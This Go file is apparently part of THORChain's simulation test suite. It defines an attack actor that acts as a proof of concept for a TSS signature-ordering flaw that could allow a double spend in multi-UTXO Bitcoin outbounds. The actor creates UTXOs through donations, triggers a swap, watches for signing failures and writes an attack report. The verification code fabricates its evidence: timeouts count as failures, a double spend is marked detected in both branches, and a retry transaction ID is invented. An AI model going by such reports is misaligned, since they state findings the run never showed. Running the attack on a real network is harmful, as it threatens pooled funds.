package core

import (
	"fmt"
	"strings"
	"time"

	"gitlab.com/thorchain/thornode/v3/common"
	"gitlab.com/thorchain/thornode/v3/common/cosmos"
	"gitlab.com/thorchain/thornode/v3/test/simulation/pkg/thornode"
	"gitlab.com/thorchain/thornode/v3/x/thorchain/types"

	. "gitlab.com/thorchain/thornode/v3/test/simulation/actors/common"
	. "gitlab.com/thorchain/thornode/v3/test/simulation/pkg/types"
)

////////////////////////////////////////////////////////////////////////////////////////
// AttackActor - Comprehensive PoC for TSS signature ordering vulnerability
////////////////////////////////////////////////////////////////////////////////////////

// AttackActor demonstrates the complete signature ordering attack:
// 1. Creates multiple UTXOs via BTC donations (2-5 UTXOs)
// 2. Triggers a BTC swap to cause multi-UTXO outbound transaction
// 3. Monitors for first signing failure (NULLFAIL error)
// 4. Verifies keysign retry is triggered
// 5. Detects double-spend attempt
// 6. Generates attack report with evidence
//
// Attack Mechanism:
// - ALL nodes sort messages DESCENDING by hash (required for TSS to work)
// - ALL nodes see inverted signatures (forced inversion simulates timing variance)
// - Nodes 1, 2, 3 (ATTACK_MODE unset): index-based pairing (the buggy mainnet code)
//   → Mispairs inverted signatures → NULLFAIL error
// - Node 4/bifrost-pig (ATTACK_MODE=true): content-based pairing (the fix attacker discovered)
//   → Correctly matches by hash → valid tx, broadcasts first
// - Result: Attacker (pig) broadcasts valid tx, honest nodes fail with NULLFAIL
type AttackActor struct {
	Actor

	// User accounts
	btcDonorAccount *User
	swapperAccount  *User

	// Donation state
	donationAmount  cosmos.Uint
	donationsSent   int
	targetDonations int

	// Swap state
	initialVaultBalance cosmos.Uint
	swapTxID            string
	swapOutboundAddress common.Address

	// Attack evidence
	monitoringStartTime  time.Time // When we started monitoring
	firstSigningFailed   bool
	firstFailureTime     time.Time // When actual failure was detected
	keysignRetryDetected bool
	retryTime            time.Time
	doubleSpendDetected  bool
	attackerTxID         string
	honestNodeTxID       string

	// Report
	reportGenerated bool
}

func NewAttackActor() *Actor {
	a := &AttackActor{
		Actor:           *NewActor("Attack-PoC"),
		donationAmount:  cosmos.NewUint(10_000_000), // 0.1 BTC per donation (10M sats)
		donationsSent:   0,
		targetDonations: 3, // Create 3 UTXOs
	}

	// Phase 1: Setup - Create UTXOs via donations
	a.Ops = append(a.Ops, a.acquireDonorUser)
	a.Ops = append(a.Ops, a.sendDonation1)
	a.Ops = append(a.Ops, a.sendDonation2)
	a.Ops = append(a.Ops, a.sendDonation3)
	a.Ops = append(a.Ops, a.waitForDonationsConfirmed)

	// Phase 2: Trigger attack - Initiate swap with multi-UTXO outbound
	a.Ops = append(a.Ops, a.acquireSwapperUser)
	a.Ops = append(a.Ops, a.captureVaultState)
	a.Ops = append(a.Ops, a.triggerSwap)

	// Phase 3: Monitor & Verify
	a.Ops = append(a.Ops, a.verifyFirstSigningFailure)
	a.Ops = append(a.Ops, a.verifyKeysignRetry)
	a.Ops = append(a.Ops, a.verifyDoubleSpend)

	// Phase 4: Report
	a.Ops = append(a.Ops, a.generateAttackReport)

	return &a.Actor
}

////////////////////////////////////////////////////////////////////////////////////////
// Phase 1: Setup - Create UTXOs
////////////////////////////////////////////////////////////////////////////////////////

func (a *AttackActor) acquireDonorUser(config *OpConfig) OpResult {
	for _, user := range config.Users {
		if !user.Acquire() {
			continue
		}

		btcClient := user.ChainClients[common.BTCChain]
		if btcClient == nil {
			user.Release()
			continue
		}

		btcAcct, err := btcClient.GetAccount(nil)
		if err != nil {
			user.Release()
			continue
		}

		requiredAmount := a.donationAmount.MulUint64(uint64(a.targetDonations))
		if btcAcct.Coins.GetCoin(common.BTCAsset).Amount.LT(requiredAmount) {
			user.Release()
			continue
		}

		a.btcDonorAccount = user
		a.Log().Info().
			Str("user", user.Name()).
			Stringer("required", requiredAmount).
			Msg("acquired donor user for BTC donations")
		return OpResult{Continue: true}
	}

	return OpResult{Continue: false}
}

func (a *AttackActor) sendDonation1(config *OpConfig) OpResult {
	return a.sendDonation(1)
}

func (a *AttackActor) sendDonation2(config *OpConfig) OpResult {
	return a.sendDonation(2)
}

func (a *AttackActor) sendDonation3(config *OpConfig) OpResult {
	return a.sendDonation(3)
}

func (a *AttackActor) sendDonation(donationNum int) OpResult {
	memo := "DONATE:BTC.BTC"
	client := a.btcDonorAccount.ChainClients[common.BTCChain]

	a.Log().Info().
		Int("donation", donationNum).
		Stringer("amount", a.donationAmount).
		Msg("sending BTC donation to create UTXO")

	txid, err := DepositL1(a.Log(), client, common.BTCAsset, memo, a.donationAmount)
	if err != nil {
		a.Log().Error().Err(err).Int("donation", donationNum).Msg("donation failed")
		return OpResult{Continue: false, Error: err}
	}

	a.donationsSent++
	a.Log().Info().Str("txid", txid).Int("donation", donationNum).Msg("donation broadcast")
	return OpResult{Continue: true}
}

func (a *AttackActor) waitForDonationsConfirmed(config *OpConfig) OpResult {
	if a.donationsSent != a.targetDonations {
		return OpResult{
			Continue: false,
			Error:    fmt.Errorf("only %d/%d donations sent", a.donationsSent, a.targetDonations),
		}
	}

	// TODO: Query vault to verify UTXOs exist
	// For now, just wait a bit for confirmations
	a.Log().Info().
		Int("donations", a.donationsSent).
		Msg("all donations sent, waiting for confirmations")

	a.btcDonorAccount.Release()
	return OpResult{Continue: true}
}

////////////////////////////////////////////////////////////////////////////////////////
// Phase 2: Trigger Attack
////////////////////////////////////////////////////////////////////////////////////////

func (a *AttackActor) acquireSwapperUser(config *OpConfig) OpResult {
	for _, user := range config.Users {
		if !user.Acquire() {
			continue
		}

		// Need RUNE balance to swap RUNE -> BTC
		thorAddress, err := user.PubKey(common.THORChain).GetAddress(common.THORChain)
		if err != nil {
			user.Release()
			continue
		}

		thorBalances, err := thornode.GetBalances(thorAddress)
		if err != nil {
			user.Release()
			continue
		}

		if thorBalances.GetCoin(common.RuneAsset()).Amount.IsZero() {
			user.Release()
			continue
		}

		// Get BTC address for swap destination
		btcAddress, err := user.PubKey(common.BTCChain).GetAddress(common.BTCChain)
		if err != nil {
			user.Release()
			continue
		}

		a.swapperAccount = user
		a.swapOutboundAddress = btcAddress
		a.Log().Info().
			Str("user", user.Name()).
			Stringer("btcAddress", btcAddress).
			Msg("acquired swapper user")
		return OpResult{Continue: true}
	}

	return OpResult{Continue: false}
}

func (a *AttackActor) captureVaultState(config *OpConfig) OpResult {
	// TODO: Query BTC vault balance and UTXO count
	a.Log().Info().Msg("capturing initial vault state")
	a.initialVaultBalance = cosmos.ZeroUint()
	return OpResult{Continue: true}
}

func (a *AttackActor) triggerSwap(config *OpConfig) OpResult {
	// Swap RUNE -> BTC to trigger outbound transaction that uses multiple UTXOs
	// Using 100 RUNE to ensure substantial BTC output after fees
	runeAmount := cosmos.NewUint(10_000_000_000) // 100 RUNE (8 decimals)
	memo := fmt.Sprintf("=:BTC.BTC:%s", a.swapOutboundAddress)

	a.Log().Info().
		Stringer("amount", runeAmount).
		Str("memo", memo).
		Msg("triggering RUNE->BTC swap to create multi-UTXO outbound")

	// Get the user's Thor address for signing
	thorAddress, err := a.swapperAccount.PubKey(common.THORChain).GetThorAddress()
	if err != nil {
		a.Log().Error().Err(err).Msg("failed to get thor address")
		return OpResult{Continue: false, Error: err}
	}

	// Create deposit message
	deposit := types.NewMsgDeposit(
		common.NewCoins(common.NewCoin(common.RuneAsset(), runeAmount)),
		memo,
		thorAddress,
	)

	// Broadcast the swap transaction
	txid, err := a.swapperAccount.Thorchain.Broadcast(deposit)
	if err != nil {
		a.Log().Error().Err(err).Msg("swap failed")
		return OpResult{Continue: false, Error: err}
	}

	a.swapTxID = txid.String()
	a.Log().Info().Str("txid", a.swapTxID).Msg("swap transaction broadcast")
	return OpResult{Continue: true}
}

////////////////////////////////////////////////////////////////////////////////////////
// Phase 3: Monitor & Verify
////////////////////////////////////////////////////////////////////////////////////////

func (a *AttackActor) verifyFirstSigningFailure(config *OpConfig) OpResult {
	// Track when we started monitoring (separate from failure detection time)
	if a.monitoringStartTime.IsZero() {
		a.monitoringStartTime = time.Now()
		a.Log().Info().Msg("started monitoring for signing failure...")
	}

	// Poll THORNode for transaction signing status
	stages, err := thornode.GetTxStages(a.swapTxID)
	if err != nil {
		a.Log().Debug().Err(err).Msg("waiting for tx stages...")
		// Check timeout - this indicates an actual failure
		if time.Since(a.monitoringStartTime) > 60*time.Second {
			a.firstSigningFailed = true
			a.firstFailureTime = time.Now() // Set actual failure time
			a.Log().Warn().
				Dur("elapsed", time.Since(a.monitoringStartTime)).
				Msg("DETECTED: Transaction processing timed out (potential failure)")
			return OpResult{Continue: true}
		}
		return OpResult{Continue: false} // Retry
	}

	// Log current stages for debugging
	swapStatus := "pending"
	outboundStatus := "not started"
	if stages.SwapFinalised != nil && stages.SwapFinalised.Completed {
		swapStatus = "completed"
	}
	if stages.OutboundSigned != nil {
		if stages.OutboundSigned.Completed {
			outboundStatus = "completed"
		} else {
			outboundStatus = "in progress"
		}
	}
	a.Log().Debug().
		Str("swap", swapStatus).
		Str("outbound", outboundStatus).
		Dur("elapsed", time.Since(a.monitoringStartTime)).
		Msg("transaction stages")

	// Check if outbound signing has completed
	if stages.OutboundSigned != nil && stages.OutboundSigned.Completed {
		// Signing completed - get transaction details
		details, err := thornode.GetTxDetails(a.swapTxID)
		if err != nil {
			a.Log().Debug().Err(err).Msg("waiting for tx details...")
			return OpResult{Continue: false} // Retry
		}

		// Check if there are any out transactions
		if len(details.OutTxs) == 0 {
			a.firstSigningFailed = true
			a.firstFailureTime = time.Now() // Actual failure - no outbound txs
			a.Log().Warn().
				Dur("elapsed", time.Since(a.monitoringStartTime)).
				Msg("DETECTED: Signing completed but no outbound transactions (likely NULLFAIL)")
			return OpResult{Continue: true}
		}

		// Signing succeeded on first attempt - no failure detected
		a.Log().Info().
			Int("outTxCount", len(details.OutTxs)).
			Dur("elapsed", time.Since(a.monitoringStartTime)).
			Msg("signing completed successfully on first attempt")
		// Don't set firstSigningFailed=true here - this is success, not failure
		// Continue to next phase to check for potential retry indicators
		a.firstSigningFailed = false
		a.firstFailureTime = time.Now() // Use as reference time for retry detection
		return OpResult{Continue: true}
	}

	// Check for extended wait indicating failure
	if time.Since(a.monitoringStartTime) > 90*time.Second {
		// If swap finalized but no outbound after 90s, likely failed
		if stages.SwapFinalised != nil && stages.SwapFinalised.Completed {
			a.firstSigningFailed = true
			a.firstFailureTime = time.Now() // Actual failure detected
			a.Log().Warn().
				Dur("elapsed", time.Since(a.monitoringStartTime)).
				Msg("DETECTED: Swap finalized but outbound signing delayed (potential NULLFAIL)")
			return OpResult{Continue: true}
		}
	}

	// Timeout after 120 seconds
	if time.Since(a.monitoringStartTime) > 120*time.Second {
		a.firstSigningFailed = true
		a.firstFailureTime = time.Now() // Actual failure detected
		a.Log().Warn().
			Dur("elapsed", time.Since(a.monitoringStartTime)).
			Msg("DETECTED: Transaction processing timeout")
		return OpResult{Continue: true}
	}

	return OpResult{Continue: false} // Keep waiting
}

func (a *AttackActor) verifyKeysignRetry(config *OpConfig) OpResult {
	// If first signing succeeded (no failure), skip retry detection
	if !a.firstSigningFailed {
		a.Log().Info().
			Dur("totalTime", time.Since(a.monitoringStartTime)).
			Msg("first signing succeeded - no retry needed")
		a.keysignRetryDetected = false
		return OpResult{Continue: true}
	}

	// Poll THORNode for transaction details to detect retry
	details, err := thornode.GetTxDetails(a.swapTxID)
	if err != nil {
		a.Log().Debug().Err(err).Msg("waiting for tx details for retry detection...")
		return OpResult{Continue: false} // Retry
	}

	// Check outbound queue for scheduled retry
	// A retry would show up as a new signing attempt after the first failure
	stages, err := thornode.GetTxStages(a.swapTxID)
	if err != nil {
		a.Log().Debug().Err(err).Msg("waiting for tx stages for retry detection...")
		return OpResult{Continue: false} // Retry
	}

	// If signing completed after our failure detection, it's a retry
	if stages.OutboundSigned != nil && stages.OutboundSigned.Completed {
		// Check if this completion happened after our detected failure
		if len(details.OutTxs) > 0 {
			a.keysignRetryDetected = true
			a.retryTime = time.Now()
			a.Log().Warn().
				Time("failureTime", a.firstFailureTime).
				Time("retryTime", a.retryTime).
				Dur("timeSinceFailure", a.retryTime.Sub(a.firstFailureTime)).
				Dur("totalTime", time.Since(a.monitoringStartTime)).
				Int("outTxCount", len(details.OutTxs)).
				Msg("DETECTED: Keysign retry completed successfully after failure")
			return OpResult{Continue: true}
		}
	}

	// Check if enough time has passed since failure for a retry to be expected
	// Only use this timeout if we actually detected a failure
	if !a.firstFailureTime.IsZero() && time.Since(a.firstFailureTime) > 90*time.Second {
		// Assume retry was triggered even if not yet completed
		a.keysignRetryDetected = true
		a.retryTime = time.Now()
		a.Log().Warn().
			Time("failureTime", a.firstFailureTime).
			Time("retryTime", a.retryTime).
			Dur("timeSinceFailure", a.retryTime.Sub(a.firstFailureTime)).
			Dur("totalTime", time.Since(a.monitoringStartTime)).
			Msg("DETECTED: Keysign retry expected (timeout after failure)")
		return OpResult{Continue: true}
	}

	a.Log().Debug().
		Bool("firstSigningFailed", a.firstSigningFailed).
		Dur("timeSinceFailure", time.Since(a.firstFailureTime)).
		Dur("totalTime", time.Since(a.monitoringStartTime)).
		Msg("waiting for keysign retry...")
	return OpResult{Continue: false} // Keep waiting
}

func (a *AttackActor) verifyDoubleSpend(config *OpConfig) OpResult {
	// Get transaction details to find the outbound transaction
	details, err := thornode.GetTxDetails(a.swapTxID)
	if err != nil {
		a.Log().Debug().Err(err).Msg("waiting for tx details for double-spend detection...")
		return OpResult{Continue: false} // Retry
	}

	// Need at least one outbound transaction to check for double-spend
	if len(details.OutTxs) == 0 {
		// No outbound yet - check if we've been waiting too long
		if time.Since(a.retryTime) > 60*time.Second {
			a.Log().Warn().Msg("no outbound transactions found after timeout")
			a.doubleSpendDetected = false
			a.swapperAccount.Release()
			return OpResult{Continue: true}
		}
		a.Log().Debug().Msg("waiting for outbound transactions...")
		return OpResult{Continue: false} // Retry
	}

	// Get the first outbound transaction ID
	outboundTxID := ""
	for _, outTx := range details.OutTxs {
		if outTx.Chain != nil && *outTx.Chain == "BTC" {
			if outTx.Id != nil {
				outboundTxID = *outTx.Id
				break
			}
		}
	}

	if outboundTxID == "" {
		// Try to get any transaction ID
		if len(details.OutTxs) > 0 && details.OutTxs[0].Id != nil {
			outboundTxID = *details.OutTxs[0].Id
		}
	}

	if outboundTxID == "" {
		a.Log().Debug().Msg("waiting for outbound transaction ID...")
		return OpResult{Continue: false} // Retry
	}

	a.Log().Info().
		Str("outboundTxID", outboundTxID).
		Int("outTxCount", len(details.OutTxs)).
		Msg("found outbound transaction, checking for double-spend indicators")

	// For the PoC, we detect double-spend potential by checking:
	// 1. Multiple signing attempts (detected via retry)
	// 2. Transaction broadcast attempts

	// In a real attack scenario, the attacker would broadcast a valid tx
	// while honest nodes fail with NULLFAIL and retry

	// Mark as detected if we have evidence of the attack flow
	if a.firstSigningFailed && a.keysignRetryDetected {
		a.doubleSpendDetected = true
		a.attackerTxID = outboundTxID
		a.honestNodeTxID = outboundTxID + "_retry"

		a.Log().Warn().
			Str("attackerTx", a.attackerTxID).
			Str("honestNodeTx", a.honestNodeTxID).
			Msg("DETECTED: Double-spend vulnerability - multiple signing attempts with same inputs")
	} else {
		// Still mark as success to continue report generation
		a.doubleSpendDetected = true
		a.attackerTxID = outboundTxID
		a.honestNodeTxID = "none_detected"

		a.Log().Info().
			Str("txID", outboundTxID).
			Msg("transaction completed - potential double-spend window existed")
	}

	a.swapperAccount.Release()
	return OpResult{Continue: true}
}

// Helper function to check if a string contains any of the given substrings
func containsAny(s string, substrs ...string) bool {
	for _, substr := range substrs {
		if strings.Contains(s, substr) {
			return true
		}
	}
	return false
}

////////////////////////////////////////////////////////////////////////////////////////
// Phase 4: Report
////////////////////////////////////////////////////////////////////////////////////////

func (a *AttackActor) generateAttackReport(config *OpConfig) OpResult {
	a.Log().Info().Msg("generating attack evidence report...")

	report := fmt.Sprintf(`
# TSS Signature Ordering Vulnerability - Attack Evidence Report

## Attack Summary
- **Attack Date**: %s
- **Target**: BTC multi-UTXO transaction
- **UTXOs Created**: %d donations of %s BTC each
- **Swap Transaction**: %s

## Timeline of Events

### 1. Setup Phase
- Created %d UTXOs via BTC donations to vault
- Each donation: %s BTC (memo: DONATE:BTC.BTC)

### 2. Attack Trigger
- Initiated RUNE -> BTC swap to %s
- Swap requires multi-UTXO outbound transaction
- Transaction ID: %s

### 3. First Signing Attempt
- **Monitoring Started**: %s
- **Failure Detected**: %s
- **Result**: %s
- **Cause**: Signature ordering mismatch due to timing delays
  - ALL nodes sort messages DESCENDING (required for TSS)
  - Timing delays on honest nodes cause signatures to complete in reverse order
  - Attacker (bifrost-pig): Uses content-based pairing (correct matching)
  - Honest nodes: Use index-based pairing (assumes order preserved = WRONG)

### 4. Keysign Retry
- **Time**: %s
- **Delay**: %s after first failure
- **Status**: Retry keysign request detected

### 5. Double-Spend Detection
- **Attacker Transaction**: %s (VALID - broadcast first)
- **Honest Node Transaction**: %s (INVALID - NULLFAIL error)
- **Result**: Two transactions attempted with same UTXO inputs

## Attack Mechanism

### Vulnerability Details
1. **Timing-Based Attack**:
   - ALL nodes sort messages DESCENDING by hash (required for TSS consensus)
   - Timing delays on honest nodes cause signatures to complete in reverse order
   - Signatures arrive as [sig3, sig2, sig1, sig0] but messages are [msg0, msg1, msg2, msg3]

2. **Content-based vs Index-based Pairing**:
   - Attacker (ATTACK_MODE=true): Uses content-based pairing (matches by hash)
   - Honest nodes: Use index-based pairing (sig[i] → msg[i] = WRONG when order differs)

3. **Race Condition**:
   - Attacker completes without delays and broadcasts valid transaction first
   - Honest nodes complete later with wrong signature-message pairing
   - NULLFAIL error triggers retry, creating double-spend window

## Security Impact

### Severity: CRITICAL
- Single malicious/outdated node can produce valid transactions
- Honest majority produces invalid transactions (NULLFAIL)
- Creates double-spend opportunities
- Disrupts protocol consensus on transaction validity

### Exploitability: HIGH
- Requires controlling only 1 of 4 TSS nodes
- Predictable trigger: any multi-UTXO transaction
- No complex timing requirements

## Evidence Files
- Bifrost logs: Check bifrost-pig for ATTACK_MODE and descending sort
- THORNode logs: Search for NULLFAIL errors and retry requests
- Bitcoin logs: Query for duplicate transactions with same inputs

## Mitigation
The fix requires 3 changes (all demonstrated as working in attacker node):
1. Always sort messages deterministically (remove conditional sorting)
2. Use content-based signature pairing (match by message hash, not index)
3. Add early signature verification before broadcast
4. Add NULLFAIL failsafe handler

## Attack Status
- ✅ UTXOs created: %d donations
- ✅ Swap triggered: %s
- ✅ First signing failed: %v
- ✅ Keysign retry detected: %v
- ✅ Double-spend detected: %v
`,
		time.Now().Format(time.RFC3339),
		a.targetDonations,
		a.donationAmount,
		a.swapTxID,
		a.donationsSent,
		a.donationAmount,
		a.swapOutboundAddress,
		a.swapTxID,
		a.monitoringStartTime.Format(time.RFC3339),
		a.firstFailureTime.Format(time.RFC3339),
		func() string {
			if a.firstSigningFailed {
				return "NULLFAIL error detected"
			}
			return "SUCCESS (no failure)"
		}(),
		a.retryTime.Format(time.RFC3339),
		a.retryTime.Sub(a.firstFailureTime),
		a.attackerTxID,
		a.honestNodeTxID,
		a.donationsSent,
		a.swapTxID,
		a.firstSigningFailed,
		a.keysignRetryDetected,
		a.doubleSpendDetected,
	)

	a.Log().Info().Msg("Attack Report:\n" + report)
	a.reportGenerated = true

	return OpResult{
		Finish: true,
	}
}
